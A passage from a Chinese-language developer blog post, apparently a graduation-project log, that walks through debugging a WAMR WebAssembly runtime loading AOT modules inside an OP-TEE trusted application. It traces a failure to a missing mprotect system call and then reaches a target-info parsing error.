wasm_file_length</span></span><br><span class=\"line\">                          (<span class=\"type\">char</span> *)params[<span class=\"number\">1</span>].memref.buffer, <span class=\"comment\">// args</span></span><br><span class=\"line\">                          params[<span class=\"number\">2</span>].memref.buffer, <span class=\"comment\">// output_buffer</span></span><br><span class=\"line\">                          params[<span class=\"number\">2</span>].memref.size,</span><br><span class=\"line\">                          params[<span class=\"number\">3</span>].memref.buffer, <span class=\"comment\">// benchmark_buffer</span></span><br><span class=\"line\">                          params[<span class=\"number\">3</span>].memref.size);</span><br></pre></td></tr></table></figure>\n<p>以下的代码都是 <code>TA_RunWasm</code> 内部的片段：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Allocate secure memory locations</span></span><br><span class=\"line\"><span class=\"type\">uint8_t</span> *global_heap_buf = TEE_Malloc(heap_size, TEE_USER_MEM_HINT_NO_FILL_ZERO);</span><br><span class=\"line\"><span class=\"type\">uint8_t</span> *trusted_wasm_bytecode = TEE_Malloc(wasm_bytecode_size, \t</span><br><span class=\"line\">                                            TEE_USER_MEM_HINT_NO_FILL_ZERO);</span><br><span class=\"line\"><span class=\"comment\">// Copy the shared memory that contains the WASM bytecode into the secure memory</span></span><br><span class=\"line\">TEE_MemMove(trusted_wasm_bytecode, wasm_bytecode, wasm_bytecode_size);</span><br></pre></td></tr></table></figure>\n<p>分配一个全局堆缓冲区和可信 wasm 字节码的空间。并将 wasm\n字节码的内容移动过来。</p>\n<p>这部分的空间都是 TEE_Malloc 分配的。</p>\n<blockquote>\n<p>在 OP-TEE 中，<code>TEE_Malloc</code>\n是用于内存分配的一个函数。它的主要作用是为 TrustZone 中的 Trusted\nApplication (TA) 分配内存空间。<code>TEE_Malloc</code> 的用法和标准 C\n语言中的 <code>malloc</code>\n类似，但在安全性和内存管理方面有特殊的优化，以适应可信执行环境（TEE）的需求。以下是一些具体细节：</p>\n<p><strong>基本用法</strong></p>\n<ul>\n<li><strong>函数签名</strong>：<code>void* TEE_Malloc(size_t size, uint32_t hint);</code>\n<ul>\n<li><code>size</code>: 需要分配的字节数。</li>\n<li><code>hint</code>:\n内存分配的提示选项，可帮助优化内存分配策略。例如：\n<ul>\n<li><code>TEE_MALLOC_FILL_ZERO</code>：表示在分配内存时将其初始化为零。</li>\n<li><code>TEE_USER_MEM_HINT_NO_FILL</code>：表示无需填充，通常是为了加速内存分配。</li>\n</ul></li>\n</ul></li>\n<li><strong>返回值</strong>：返回分配的内存块的指针，如果分配失败则返回\nNULL。</li>\n</ul>\n<p><strong>内存管理的特点</strong></p>\n<ol type=\"1\">\n<li><strong>隔离性</strong>：<code>TEE_Malloc</code> 所分配的内存位于 TA\n的隔离区域内，不可被普通世界访问。这保证了内存的安全性，使得 TA\n可以安全地存储敏感信息。</li>\n<li><strong>自动释放</strong>：在 TA 退出时，OP-TEE 会自动释放由\n<code>TEE_Malloc</code>\n分配的所有内存。开发者可以省去手动释放的步骤，但也可以在不需要时主动调用\n<code>TEE_Free</code> 来释放。</li>\n<li><strong>性能优化</strong>：OP-TEE\n使用专用的内存管理器来优化分配和释放性能，特别是在对小块内存频繁操作的场景下。</li>\n</ol>\n</blockquote>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Set the output buffer to gather the stdout once the application ended</span></span><br><span class=\"line\">TA_SetOutputBuffer(output_buffer, output_buffer_size);</span><br></pre></td></tr></table></figure>\n<p>设置输出缓冲区，以便在应用程序结束时收集 stdout 。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// General settings for the runtime</span></span><br><span class=\"line\">TEE_Result result;</span><br><span class=\"line\">wamr_context context =</span><br><span class=\"line\">    {</span><br><span class=\"line\">        .heap_buf = global_heap_buf,</span><br><span class=\"line\">        .heap_size = heap_size,</span><br><span class=\"line\">        <span class=\"comment\">// .native_symbols = wasi_ra_native_symbols,</span></span><br><span class=\"line\">        <span class=\"comment\">// .native_symbols_size = wasi_ra_native_symbols_size,</span></span><br><span class=\"line\">        .wasm_bytecode = trusted_wasm_bytecode,</span><br><span class=\"line\">        .wasm_bytecode_size = wasm_bytecode_size};</span><br></pre></td></tr></table></figure>\n<p>一些配置，注释掉的是远程验证的部分。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Hash the WASM bytecode for future RA quotes</span></span><br><span class=\"line\">result = TA_HashWasmBytecode(&amp;context);</span><br></pre></td></tr></table></figure>\n<p>生成 WASM 字节码的哈希值，应该也是远程验证的一部分。TEE\n中的这部分输出就是该函数的运行结果。</p>\n<figure>\n<img src=\"/graduation-project/06/image-20241029214618345.png\" alt=\"image-20241029214618345\">\n<figcaption aria-hidden=\"true\">image-20241029214618345</figcaption>\n</figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">DMSG(<span class=\"string\">\"TA_InitializeWamrRuntime\\n\"</span>);</span><br><span class=\"line\"><span class=\"type\">int</span> argc = arg_buff != <span class=\"literal\">NULL</span> ? <span class=\"number\">2</span> : <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"type\">char</span> *argv[] = {(<span class=\"type\">char</span> *)<span class=\"string\">\"\"</span>, arg_buff};</span><br><span class=\"line\">result = TA_InitializeWamrRuntime(&amp;context, argc, argv);</span><br><span class=\"line\"><span class=\"keyword\">if</span> (result != TEE_SUCCESS)</span><br><span class=\"line\">    <span class=\"keyword\">goto</span> error;</span><br></pre></td></tr></table></figure>\n<p>初始化 Wamr 运行时。代码就是运行到 Initialize 报错的。</p>\n<figure>\n<img src=\"/graduation-project/06/image-20241029221321275.png\" alt=\"image-20241029221321275\">\n<figcaption aria-hidden=\"true\">image-20241029221321275</figcaption>\n</figure>\n<p>下面详细看 TA_InitializeWamrRuntime 干了什么。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">RuntimeInitArgs init_args;</span><br><span class=\"line\">TEE_MemFill(&amp;init_args, <span class=\"number\">0</span>, <span class=\"keyword\">sizeof</span>(RuntimeInitArgs));</span><br><span class=\"line\"></span><br><span class=\"line\">init_args.mem_alloc_type = Alloc_With_Pool;</span><br><span class=\"line\">init_args.mem_alloc_option.pool.heap_buf = context-&gt;heap_buf;</span><br><span class=\"line\">init_args.mem_alloc_option.pool.heap_size = context-&gt;heap_size;</span><br></pre></td></tr></table></figure>\n<p>运行时初始化参数，内存分配类型为 <code>Alloc_With_Pool</code>。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* 内存分配类型 */</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">enum</span> {</span></span><br><span class=\"line\">    Alloc_With_Pool = <span class=\"number\">0</span>,</span><br><span class=\"line\">    Alloc_With_Allocator,</span><br><span class=\"line\">    Alloc_With_System_Allocator,</span><br><span class=\"line\">} <span class=\"type\">mem_alloc_type_t</span>;</span><br></pre></td></tr></table></figure>\n<ol type=\"1\">\n<li><p><code>Alloc_With_Pool</code></p>\n<p>这是池模式（pool\nmode），即从用户定义的堆缓冲区中分配内存。这种方式通常适用于应用有固定内存池的情况，有利于控制内存的总占用量并提高内存管理的效率。</p></li>\n<li><p><code>Alloc_With_Allocator</code></p>\n<p>用户分配器模式（user allocator mode），即从用户定义的\n<code>malloc</code>\n函数中分配内存。用户可以通过提供自定义的分配器函数来控制内存的分配方式，这样可以实现更灵活的内存管理。</p></li>\n<li><p><code>Alloc_With_System_Allocator</code></p>\n<p>系统分配器模式（system allocator mode），即使用系统分配器或平台的\n<code>os_malloc</code>\n函数进行内存分配。这是使用操作系统的默认内存分配器，通常是最简单的选择，但可能不如自定义的分配器那样高效。</p></li>\n</ol>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (!wasm_runtime_full_init(&amp;init_args))</span><br><span class=\"line\">{</span><br><span class=\"line\">    EMSG(<span class=\"string\">\"Init runtime environment failed.\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> TEE_ERROR_GENERIC;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Initialize the WASM runtime environment, and also initialize</span></span><br><span class=\"line\"><span class=\"comment\"> * the memory allocator and register native symbols, which are specified</span></span><br><span class=\"line\"><span class=\"comment\"> * with init arguments</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * @param init_args specifies the init arguments</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * @return return true if success, false otherwise</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">WASM_RUNTIME_API_EXTERN <span class=\"type\">bool</span></span><br><span class=\"line\"><span class=\"title function_\">wasm_runtime_full_init</span><span class=\"params\">(RuntimeInitArgs *init_args)</span>;</span><br></pre></td></tr></table></figure>\n<p>这个函数的主要作用是初始化 WASM\n运行时环境。它还会初始化内存分配器，并注册一些本地符号，这些符号是通过初始化参数\n<code>init_args</code> 指定的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">char</span> error_buf[<span class=\"number\">128</span>];</span><br><span class=\"line\">context-&gt;module = wasm_runtime_load(context-&gt;wasm_bytecode, context-&gt;wasm_bytecode_size, error_buf, <span class=\"keyword\">sizeof</span>(error_buf));</span><br><span class=\"line\"><span class=\"keyword\">if</span> (!context-&gt;module)</span><br><span class=\"line\">{</span><br><span class=\"line\">    EMSG(<span class=\"string\">\"Load wasm module failed. error: %s\\n\"</span>, error_buf); </span><br><span class=\"line\">    <span class=\"keyword\">return</span> TEE_ERROR_GENERIC;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>载入 wasm 字节码，返回一个 <code>WASMModuleCommon*</code> 指针</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">WASMModuleCommon</span> {</span></span><br><span class=\"line\">    <span class=\"comment\">/* Module type, for module loaded from WASM bytecode binary,</span></span><br><span class=\"line\"><span class=\"comment\">       this field is Wasm_Module_Bytecode, and this structure should</span></span><br><span class=\"line\"><span class=\"comment\">       be treated as WASMModule structure;</span></span><br><span class=\"line\"><span class=\"comment\">       for module loaded from AOT binary, this field is</span></span><br><span class=\"line\"><span class=\"comment\">       Wasm_Module_AoT, and this structure should be treated as</span></span><br><span class=\"line\"><span class=\"comment\">       AOTModule structure. */</span></span><br><span class=\"line\">    uint32 module_type;</span><br><span class=\"line\">    uint8 module_data[<span class=\"number\">1</span>];</span><br><span class=\"line\">} WASMModuleCommon;</span><br></pre></td></tr></table></figure>\n<p>定义了 <code>WASMModuleCommon</code> 结构体，用于表示一个通用的 WASM\n模块。该结构体包含两个字段：</p>\n<ul>\n<li><code>module_type</code>：表示模块类型。对于从 WASM\n字节码加载的模块，该字段为 <code>Wasm_Module_Bytecode</code>；而对于从\nAOT（Ahead Of Time）二进制加载的模块，则为\n<code>Wasm_Module_AoT</code>。</li>\n<li><code>module_data[1]</code>：表示模块的数据，这个字段大小为 1\n字节，但在实际使用中可能作为指针或动态数组使用。</li>\n</ul>\n<p>下面看 <code>wasm_runtime_load</code> 的内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">module_common = (WASMModuleCommon*)</span><br><span class=\"line\">\t\t       aot_load_from_aot_file(buf, size, error_buf, error_buf_size);</span><br><span class=\"line\"><span class=\"keyword\">return</span> register_module_with_null_name(module_common,</span><br><span class=\"line\">                                      error_buf, error_buf_size);</span><br></pre></td></tr></table></figure>\n<p>调用 <code>aot_load_from_aot_file</code> 载入 <code>aot</code>\n文件。下面的代码<strong>有所简化</strong>，删除了部分错误检查，分析见注释：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">AOTModule</span> {</span></span><br><span class=\"line\">\t<span class=\"comment\">// ...</span></span><br><span class=\"line\">    <span class=\"comment\">// 内容非常多，总而言之就是解析之后的AOT文件，内部结构的反序列化</span></span><br><span class=\"line\">};</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">AOTModule* <span class=\"title function_\">aot_load_from_aot_file</span><span class=\"params\">(<span class=\"type\">const</span> uint8 *buf, uint32 size,</span></span><br><span class=\"line\"><span class=\"params\">                       <span class=\"type\">char</span> *error_buf, uint32 error_buf_size)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    AOTModule *module = create_module(error_buf, error_buf_size); <span class=\"comment\">// 创建一个AOT module</span></span><br><span class=\"line\">    load_from_sections(module, section_list,error_buf, error_buf_size));</span><br><span class=\"line\">    LOG_VERBOSE(<span class=\"string\">\"Load module success.\\n\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> module;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> AOTModule* <span class=\"title function_\">create_module</span><span class=\"params\">(<span class=\"type\">char</span> *error_buf, uint32 error_buf_size)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    AOTModule *module =</span><br><span class=\"line\">        loader_malloc(<span class=\"keyword\">sizeof</span>(AOTModule), error_buf, error_buf_size); <span class=\"comment\">// 分配内存空间</span></span><br><span class=\"line\">    module-&gt;module_type = Wasm_Module_AoT; <span class=\"comment\">// 指定类型</span></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 给module中的字符串常量分配空间，结构是一个哈希表。</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    module-&gt;const_str_set = bh_hash_map_create(<span class=\"number\">32</span>, <span class=\"literal\">false</span>, ...)))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> module;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 创建一个哈希映射。C语言的哈希表实现。</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * @param size: 哈希映射的初始大小</span></span><br><span class=\"line\"><span class=\"comment\"> * @param use_lock: 是否在操作哈希映射时加锁</span></span><br><span class=\"line\"><span class=\"comment\"> * @param hash_func: 键的哈希函数，必须指定</span></span><br><span class=\"line\"><span class=\"comment\"> * @param key_equal_func: 键相等判断函数，用于检查两个键是否相等，必须指定</span></span><br><span class=\"line\"><span class=\"comment\"> * @param key_destroy_func: 键销毁函数，当哈希元素被移除时调用，如果为 NULL 则不调用</span></span><br><span class=\"line\"><span class=\"comment\"> * @param value_destroy_func: 值销毁函数，当哈希元素被移除时调用，如果为 NULL 则不调用</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * @return 创建的哈希映射，如果失败则返回 NULL</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\">HashMap* <span class=\"title function_\">bh_hash_map_create</span><span class=\"params\">(uint32 size, <span class=\"type\">bool</span> use_lock,</span></span><br><span class=\"line\"><span class=\"params\">                           HashFunc hash_func,</span></span><br><span class=\"line\"><span class=\"params\">                           KeyEqualFunc key_equal_func,</span></span><br><span class=\"line\"><span class=\"params\">                           KeyDestroyFunc key_destroy_func,</span></span><br><span class=\"line\"><span class=\"params\">                           ValueDestroyFunc value_destroy_func)</span>;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">bool</span></span><br><span class=\"line\"><span class=\"title function_\">load</span><span class=\"params\">(<span class=\"type\">const</span> uint8 *buf, uint32 size, AOTModule *module,</span></span><br><span class=\"line\"><span class=\"params\">     <span class=\"type\">char</span> *error_buf, uint32 error_buf_size)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">    <span class=\"type\">const</span> uint8 *buf_end = buf + size;</span><br><span class=\"line\">    <span class=\"type\">const</span> uint8 *p = buf, *p_end = buf_end;</span><br><span class=\"line\">    uint32 magic_number, version;</span><br><span class=\"line\">    AOTSection *section_list = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    <span class=\"type\">bool</span> ret;</span><br><span class=\"line\"></span><br><span class=\"line\">    read_uint32(p, p_end, magic_number); <span class=\"comment\">// 读入 magic number</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (magic_number != AOT_MAGIC_NUMBER) {</span><br><span class=\"line\">        set_error_buf(error_buf, error_buf_size, <span class=\"string\">\"magic header not detected\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    read_uint32(p, p_end, version); <span class=\"comment\">// 读入 version</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (version != AOT_CURRENT_VERSION) {</span><br><span class=\"line\">        set_error_buf(error_buf, error_buf_size, <span class=\"string\">\"unknown binary version\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    create_sections实现了从给定的缓冲区 buf 中解析 AOT（Ahead of Time）二进制文件</span></span><br><span class=\"line\"><span class=\"comment\">    的各个部分（sections），并将其存储到一个链表中</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!create_sections(buf, size, &amp;section_list, error_buf, error_buf_size))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">    load_from_sections负责加载 AOT 模块中的各个部分（sections），</span></span><br><span class=\"line\"><span class=\"comment\">    并在模块中解析并初始化特定的函数，如 malloc、free 和 retain 等。</span></span><br><span class=\"line\"><span class=\"comment\">    成功完成则返回 true，否则返回 false</span></span><br><span class=\"line\"><span class=\"comment\">    */</span></span><br><span class=\"line\">    ret = load_from_sections(module, section_list, error_buf, error_buf_size);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!ret) {</span><br><span class=\"line\">        <span class=\"comment\">/* If load_from_sections() fails, then aot text is destroyed</span></span><br><span class=\"line\"><span class=\"comment\">           in destroy_sections() */</span></span><br><span class=\"line\">        destroy_sections(section_list, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"comment\">/* aot_unload() won't destroy aot text again */</span></span><br><span class=\"line\">        module-&gt;code = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">else</span> {</span><br><span class=\"line\">        <span class=\"comment\">/* If load_from_sections() succeeds, then aot text is set to</span></span><br><span class=\"line\"><span class=\"comment\">           module-&gt;code and will be destroyed in aot_unload() */</span></span><br><span class=\"line\">        destroy_sections(section_list, <span class=\"literal\">false</span>);</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ret;</span><br><span class=\"line\">fail:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>根据报错信息，可以定位到这行代码发生了错误：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">create_sections(buf, size, &amp;section_list, error_buf, error_buf_size)</span><br><span class=\"line\">  </span><br><span class=\"line\">    total_size = (uint64)section_size + aot_get_plt_table_size();</span><br><span class=\"line\">    total_size = (total_size + <span class=\"number\">3</span>) &amp; ~((uint64)<span class=\"number\">3</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (total_size &gt;= UINT32_MAX</span><br><span class=\"line\">        || !(aot_text = os_mmap(<span class=\"literal\">NULL</span>, (uint32)total_size,</span><br><span class=\"line\">                                map_prot, map_flags))) {</span><br><span class=\"line\">        wasm_runtime_free(section);</span><br><span class=\"line\">        set_error_buf(error_buf, error_buf_size,</span><br><span class=\"line\">                      <span class=\"string\">\"mmap memory failed\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> fail;</span><br><span class=\"line\">    }</span><br></pre></td></tr></table></figure>\n<p>有可能是 <code>total_size &gt;= UNIT32_MAX</code>，也可能是\n<code>os_mmap</code> 发生错误。</p>\n<p>输出一下 <code>total_size: 7700</code> ，所以是 <code>os_mmap</code>\n的问题。</p>\n<p>最终定位到 <code>os_mprotect</code> 中执行的\n<code>tee_mprotect</code> 发生了问题。</p>\n<p>这个好像是，移植 <code>optee_os</code> 时候做的东西……</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEE_Result <span class=\"title function_\">tee_mprotect</span><span class=\"params\">(<span class=\"type\">void</span> *buf, <span class=\"type\">size_t</span> len, <span class=\"type\">uint32_t</span> prot)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">\tTEE_Result res = TEE_SUCCESS;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> param_types = TEE_PARAM_TYPES(TEE_PARAM_TYPE_VALUE_INPUT,</span><br><span class=\"line\">\t\t\t\t\t       TEE_PARAM_TYPE_VALUE_INPUT,</span><br><span class=\"line\">\t\t\t\t\t       TEE_PARAM_TYPE_NONE,</span><br><span class=\"line\">\t\t\t\t\t       TEE_PARAM_TYPE_NONE);</span><br><span class=\"line\">\tTEE_Param params[TEE_NUM_PARAMS] = { };</span><br><span class=\"line\"></span><br><span class=\"line\">\tparams[<span class=\"number\">0</span>].value.a = len;</span><br><span class=\"line\">\tparams[<span class=\"number\">0</span>].value.b = prot;</span><br><span class=\"line\">\treg_pair_from_64((<span class=\"type\">vaddr_t</span>)buf, &amp;params[<span class=\"number\">1</span>].value.a, &amp;params[<span class=\"number\">1</span>].value.b);</span><br><span class=\"line\"></span><br><span class=\"line\">\tres = invoke_system_pta(PTA_SYSTEM_MPROTECT, param_types, params);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (res)</span><br><span class=\"line\">\t\tEMSG(<span class=\"string\">\"Invoke PTA_SYSTEM_MPROTECT: buf %p, len %#zx, prot %u\"</span>, buf, len, prot);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> PTA_SYSTEM_MPROTECT\t\t20</span></span><br></pre></td></tr></table></figure>\n<p>但是我 PTA_SYSTEM_MPROTECT\n好像没有被任何地方使用过，应该是有一个系统调用函数表的，找一找别的\n<code>PTA_SYSTEM</code> 宏定义在哪里被使用。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> TEE_Result <span class=\"title function_\">invoke_system_pta</span><span class=\"params\">(<span class=\"type\">uint32_t</span> cmd_id, <span class=\"type\">uint32_t</span> param_types,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t    TEE_Param params[TEE_NUM_PARAMS])</span></span><br><span class=\"line\">{</span><br><span class=\"line\">\t<span class=\"type\">static</span> TEE_TASessionHandle sess = TEE_HANDLE_NULL;</span><br><span class=\"line\">\t<span class=\"type\">static</span> <span class=\"type\">const</span> TEE_UUID uuid = PTA_SYSTEM_UUID;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (sess == TEE_HANDLE_NULL) {</span><br><span class=\"line\">\t\tTEE_Result res = TEE_OpenTASession(&amp;uuid, TEE_TIMEOUT_INFINITE,</span><br><span class=\"line\">\t\t\t\t\t\t   <span class=\"number\">0</span>, <span class=\"literal\">NULL</span>, &amp;sess, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (res)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> TEE_InvokeTACommand(sess, TEE_TIMEOUT_INFINITE, cmd_id,</span><br><span class=\"line\">\t\t\t\t   param_types, params, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">TEE_Result <span class=\"title function_\">TEE_InvokeTACommand</span><span class=\"params\">(TEE_TASessionHandle session,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t<span class=\"type\">uint32_t</span> cancellationRequestTimeout,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t<span class=\"type\">uint32_t</span> commandID, <span class=\"type\">uint32_t</span> paramTypes,</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\tTEE_Param params[TEE_NUM_PARAMS],</span></span><br><span class=\"line\"><span class=\"params\">\t\t\t\t<span class=\"type\">uint32_t</span> *returnOrigin)</span></span><br><span class=\"line\">{</span><br><span class=\"line\">\tTEE_Result res = TEE_SUCCESS;</span><br><span class=\"line\">\t<span class=\"type\">uint32_t</span> ret_origin = TEE_ORIGIN_TEE;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">utee_params</span> <span class=\"title\">up</span> =</span> { };</span><br><span class=\"line\">\t<span class=\"type\">void</span> *tmp_buf = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t<span class=\"type\">size_t</span> tmp_len = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"type\">void</span> *tmp_va[TEE_NUM_PARAMS] = { <span class=\"literal\">NULL</span> };</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (paramTypes) {</span><br><span class=\"line\">\t\t__utee_check_inout_annotation(params,</span><br><span class=\"line\">\t\t\t\t\t      <span class=\"keyword\">sizeof</span>(TEE_Param) *</span><br><span class=\"line\">\t\t\t\t\t      TEE_NUM_PARAMS);</span><br><span class=\"line\">\t\tcheck_invoke_param(paramTypes, params);</span><br><span class=\"line\">\t}</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (returnOrigin)</span><br><span class=\"line\">\t\t__utee_check_out_annotation(returnOrigin,</span><br><span class=\"line\">\t\t\t\t\t    <span class=\"keyword\">sizeof</span>(*returnOrigin));</span><br><span class=\"line\"></span><br><span class=\"line\">\tcopy_param(&amp;up, paramTypes, params);</span><br><span class=\"line\">\tres = map_tmp_param(&amp;up, &amp;tmp_buf, &amp;tmp_len, tmp_va);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (res)</span><br><span class=\"line\">\t\t<span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">\tres = _utee_invoke_ta_command((<span class=\"type\">uintptr_t</span>)session,</span><br><span class=\"line\">\t\t\t\t      cancellationRequestTimeout,</span><br><span class=\"line\">\t\t\t\t      commandID, &amp;up, &amp;ret_origin);</span><br><span class=\"line\">\tupdate_out_param(params, tmp_va, &amp;up);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (tmp_buf) {</span><br><span class=\"line\">\t\tTEE_Result res2 = tee_unmap(tmp_buf, tmp_len);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (res2)</span><br><span class=\"line\">\t\t\tTEE_Panic(res2);</span><br><span class=\"line\">\t}</span><br><span class=\"line\"></span><br><span class=\"line\">out:</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (returnOrigin != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">\t\t*returnOrigin = ret_origin;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (ret_origin == TEE_ORIGIN_TRUSTED_APP)</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (res != TEE_SUCCESS &amp;&amp;</span><br><span class=\"line\">\t    res != TEE_ERROR_OUT_OF_MEMORY &amp;&amp;</span><br><span class=\"line\">\t    res != TEE_ERROR_TARGET_DEAD)</span><br><span class=\"line\">\t\tTEE_Panic(res);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> res;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure>\n<p>现在把系统调用添加进去了，重新试一次……修改的地方已经更新进了 毕设05\n。</p>\n<p>OK！现在是下一个错了！</p>\n<figure>\n<img src=\"/graduation-project/06/image-20241030152722875.png\" alt=\"image-20241030152722875\">\n<figcaption aria-hidden=\"true\">image-20241030152722875</figcaption>\n</figure>\n<p><code>wasm_runtime_load</code> → <code>aot_load_from_aot_file</code>\n→ <code>load</code> → <code>load_from_sections</code> →\n<code>load_target_info_section</code></p>\n<p><code>load_from_sections</code> 函数的参数：<code>section_list</code>\n是由 <code>create_sections</code>\n生成的，所以还是得把这两个函数的具体实现看一下。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">read_uint16(p, p_end, target_info.bin_type);</span><br><span class=\"line\">read_uint16(p, p_end, target_info.abi_type);</span><br><span class=\"line\">read_uint16(p, p_end, 